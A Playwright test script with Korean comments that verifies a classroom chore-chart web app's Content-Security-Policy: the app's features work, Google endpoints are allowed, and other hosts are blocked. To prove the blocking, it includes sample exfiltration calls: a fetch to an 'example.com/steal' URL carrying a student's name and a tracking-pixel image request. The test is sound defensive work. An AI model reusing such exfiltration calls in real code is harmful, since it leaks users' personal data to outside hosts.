// 배포본(docs/index.html)의 보안 규칙(Content-Security-Policy) 검사
//   1) 앱 기능이 규칙에 막히지 않는다   2) 구글이 아닌 곳으로는 보낼 수 없다
//   로컬: (cd docs && python3 -m http.server 8765 &) ; node test/run-csp.js http://127.0.0.1:8765/ <스크린샷 폴더> <사진 파일>
//   실제 주소: node test/run-csp.js https://kukikoki7898-cyber.github.io/code/docs/ <스크린샷 폴더> <사진 파일>
var { chromium } = require('playwright');
var fs = require('fs');
var results = [];
function check(name, ok, detail) { results.push((ok ? '통과 ' : '실패 ') + name + (detail !== undefined && detail !== '' ? '  (' + detail + ')' : '')); }
async function toast(p, re) { await p.waitForFunction(function (s) { var t = document.querySelector('.toast'); return t && new RegExp(s).test(t.textContent); }, re.source, { timeout: 15000 }); }

(async function () {
  var base = process.argv[2].replace(/\/?$/, '/'), shots = process.argv[3], photo = process.argv[4];
  var b = await chromium.launch();
  var ctx = await b.newContext({ viewport: { width: 1400, height: 900 }, acceptDownloads: true });
  await ctx.addInitScript(function () {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', function (e) { window.__csp.push(e.violatedDirective + ' ' + e.blockedURI); });
  });
  var p = await ctx.newPage(), errs = [];
  p.on('pageerror', function (e) { errs.push(String(e)); });
  var csp = function () { return p.evaluate(function () { return window.__csp.slice(); }); };

  await p.goto(base + '?t=' + Date.now());
  var meta = await p.evaluate(function () { var m = document.querySelector('meta[http-equiv="Content-Security-Policy"]'); return m ? m.content : ''; });
  check('0. 배포본에 보안 규칙이 들어 있다', /connect-src https:\/\/www\.googleapis\.com https:\/\/sheets\.googleapis\.com https:\/\/oauth2\.googleapis\.com https:\/\/accounts\.google\.com;/.test(meta), meta.slice(0, 60));

  // ---- 1. 앱의 기능이 규칙에 막히지 않는다 (이 기기에 저장 방식) ----
  await p.waitForSelector('#nc-name');
  await p.fill('#nc-name', '규칙반'); await p.fill('#nc-pw', '1234'); await p.click('[data-act=createclass]');
  await p.waitForSelector('#bulk'); await p.fill('#bulk', '김하늘 칠판 지우기\n이바다 우유 나르기');
  await p.click('[data-act=bulkset]'); await p.click('[data-act=saveroster]'); await toast(p, /저장했어요/);
  await p.click('[data-act=board]'); await p.waitForSelector('.card');
  await p.click('#card-0'); await p.click('#card-1'); await p.waitForTimeout(1500);    // 도장, 색종이, 소리, 축하
  await p.click('[data-act=stickers]'); await p.waitForSelector('table.st');
  await p.click('[data-act=board]'); await p.waitForSelector('.card');
  await p.click('.fsbtn'); await p.waitForTimeout(300); await p.click('.fsbtn'); await p.waitForTimeout(300);
  await p.click('[data-act=settings]'); await p.fill('#pw', '1234'); await p.click('[data-act=login]'); await p.waitForSelector('.tabs');
  await p.click('[data-act=tab][data-tab=look]'); await p.click('[data-act=bg][data-v=sky]');
  await p.click('[data-act=bgpick]'); await p.setInputFiles('#bg-file', photo); await toast(p, /배경 사진을 바꿨어요/);
  await p.click('[data-act=tab][data-tab=class]');
  var d1 = await Promise.all([p.waitForEvent('download'), p.click('[data-act=dl][data-sheet="기록"]')]);
  var d2 = await Promise.all([p.waitForEvent('download'), p.click('[data-act=backup]')]);
  var csv = fs.readFileSync(await d1[0].path(), 'utf8'), bk = JSON.parse(fs.readFileSync(await d2[0].path(), 'utf8'));
  check('1. 기록 내려받기와 백업 파일 저장이 된다', /김하늘/.test(csv) && bk.app === 'oneRole');
  await p.click('[data-act=board]'); await p.waitForSelector('.card');
  var fontOk = await p.evaluate(function () { return document.fonts.ready.then(function () { return document.fonts.check('20px Jua'); }); });
  check('1-1. 글꼴(Google Fonts)을 불러온다', fontOk);
  check('1-2. 배경 사진이 깔린다', (await p.evaluate(function () { return document.body.className; })) === 'hasimg');
  await p.screenshot({ path: shots + '/csp-board.png' });
  var v = await csp();
  check('1-3. 위 기능을 쓰는 동안 보안 규칙에 막힌 것이 없다', v.length === 0, v.join(' | '));

  // ---- 2. 구글이 아닌 곳으로는 보낼 수 없다 ----
  var r = await p.evaluate(function () {
    return fetch('https://example.com/steal?name=' + encodeURIComponent('김하늘')).then(function () { return '보내짐'; }, function () { return '막힘'; });
  });
  await p.waitForTimeout(300);
  v = await csp();
  check('2. 다른 주소로 fetch 하면 브라우저가 막는다', r === '막힘' && v.some(function (x) { return /^connect-src https:\/\/example\.com/.test(x); }), r + ' / ' + v.join(' | '));
  await p.evaluate(function () { var i = new Image(); i.src = 'https://example.com/pixel.gif?d=1'; document.body.appendChild(i); });
  await p.waitForTimeout(500);
  v = await csp();
  check('2-1. 다른 주소의 이미지로 몰래 보내는 것도 막는다', v.some(function (x) { return /^img-src https:\/\/example\.com/.test(x); }), v.slice(-1).join(''));
  var n = v.length;
  await p.evaluate(function () { return fetch('https://www.googleapis.com/drive/v3/about?fields=user').then(function () {}, function () {}); });
  await p.waitForTimeout(500);
  v = await csp();
  check('2-2. 구글 주소는 허용된다', v.length === n, v.slice(n).join(' | '));

  // ---- 3. 구글 로그인 창이 규칙에 막히지 않는다 ----
  var c2 = await b.newContext({ viewport: { width: 1400, height: 900 } });
  await c2.addInitScript(function () { window.__csp = []; document.addEventListener('securitypolicyviolation', function (e) { window.__csp.push(e.violatedDirective + ' ' + e.blockedURI); }); });
  var q = await c2.newPage();
  q.on('pageerror', function (e) { errs.push(String(e)); });
  await q.goto(base + '?g'); await q.waitForSelector('#or-login');
  var note = await q.textContent('#or-login');
  check('3. 로그인 창에 비밀번호·권한 안내가 있다', /구글 화면에만/.test(note) && /이 앱이 만든 스프레드시트뿐/.test(note));
  await q.screenshot({ path: shots + '/csp-login.png' });
  var href = await q.getAttribute('#or-login a', 'href');
  check('3-1. "자세히 보기"가 개인정보 안내로 이어진다', href === 'privacy.html#login', href);
  await q.waitForFunction(function () { return window.google && window.google.accounts && window.google.accounts.oauth2; }, null, { timeout: 20000 }).catch(function () {});
  var pop = await Promise.all([c2.waitForEvent('page', { timeout: 20000 }).then(function (x) { return x.url(); }).catch(function () { return ''; }), q.click('#or-go')]);
  check('3-2. 구글 로그인 창이 열린다', /^https:\/\/accounts\.google\.com\//.test(pop[0]), pop[0].slice(0, 40));
  var v2 = await q.evaluate(function () { return window.__csp.slice(); });
  check('3-3. 로그인 과정에서 보안 규칙에 막힌 것이 없다', v2.length === 0, v2.join(' | '));

  // ---- 4. 개인정보 안내 페이지 ----
  var pr = await c2.newPage();
  await pr.goto(base + 'privacy.html#login');
  var txt = await pr.textContent('main');
  check('4. 개인정보 안내에 자주 묻는 질문과 확인 방법이 있다', /비밀번호가 이 앱에 저장되나요/.test(txt) && /직접 확인하는 방법/.test(txt) && /서드 파티 앱/.test(txt));
  await pr.screenshot({ path: shots + '/csp-privacy.png', fullPage: true });

  check('오류 없음', errs.length === 0, errs.join(' | '));
  console.log(results.join('\n'));
  await b.close();
  process.exit(results.some(function (x) { return x.indexOf('실패') === 0; }) ? 1 : 0);
})().catch(function (e) { console.log(results.join('\n')); console.error(String(e).split('\n')[0]); process.exit(2); });
